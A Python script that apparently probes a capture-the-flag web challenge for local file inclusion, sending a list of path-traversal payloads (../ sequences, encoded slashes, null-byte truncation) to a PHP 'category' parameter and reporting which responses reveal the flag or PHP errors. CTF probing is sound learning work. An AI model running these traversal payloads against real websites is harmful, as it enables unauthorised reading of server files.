"""Round 2 probe of a-bad-day: understand include semantics via prefix traversal."""
import re
import urllib.parse
import urllib.request

BASE = "http://noctf.fa1lsnow.com:40547/index.php?category="

PAYLOADS = [
    "woofers",                       # control
    "woofers/../flag",               # control (we saw html comment)
    "woofers/../flag.php",
    "woofers/../flagx",
    "woofers/../flag/",
    "woofers/../index",
    "woofers/../woofers",
    "woofers/../meowers/../flag",
    "woofers/../../flag",
    "meowers/../flag",
    "woofers/../%66lag",             # URL-encoded f
    "woofers/..%2fflag",
    "woofers%2f..%2fflag",
    "woofers/./../flag",
    "woofers/../flag%00.php",
    "woofers/../flag.php%00",
]


def fetch(cat):
    url = BASE + urllib.parse.quote(cat, safe="/%")
    req = urllib.request.Request(url, headers={"User-Agent": "probe"})
    try:
        with urllib.request.urlopen(req, timeout=8) as r:
            return r.status, r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")
    except Exception as e:  # noqa: BLE001
        return "ERR", repr(e)


for p in PAYLOADS:
    status, body = fetch(p)
    note = ""
    if isinstance(body, str):
        m = re.search(r'<div class="page-include">(.*?)</div>', body, re.S)
        if m:
            note = re.sub(r"\s+", " ", m.group(1)).strip()[:200]
        if "Sorry" in body:
            note += " [SORRY]"
        if "flag" in body.lower():
            note += " [contains 'flag']"
        if "Warning" in body or "Fatal" in body or "Notice" in body:
            wm = re.search(r"(Warning|Fatal error|Notice|Deprecated)[^<]{0,200}", body)
            note += " [PHPERR: " + (wm.group(0) if wm else "?") + "]"
    print(f"[{status}] {p!r}\n      {note}")
    if status == 200 and isinstance(body, str) and len(body) < 700:
        print("      RAW:", re.sub(r"\s+", " ", body)[:500])
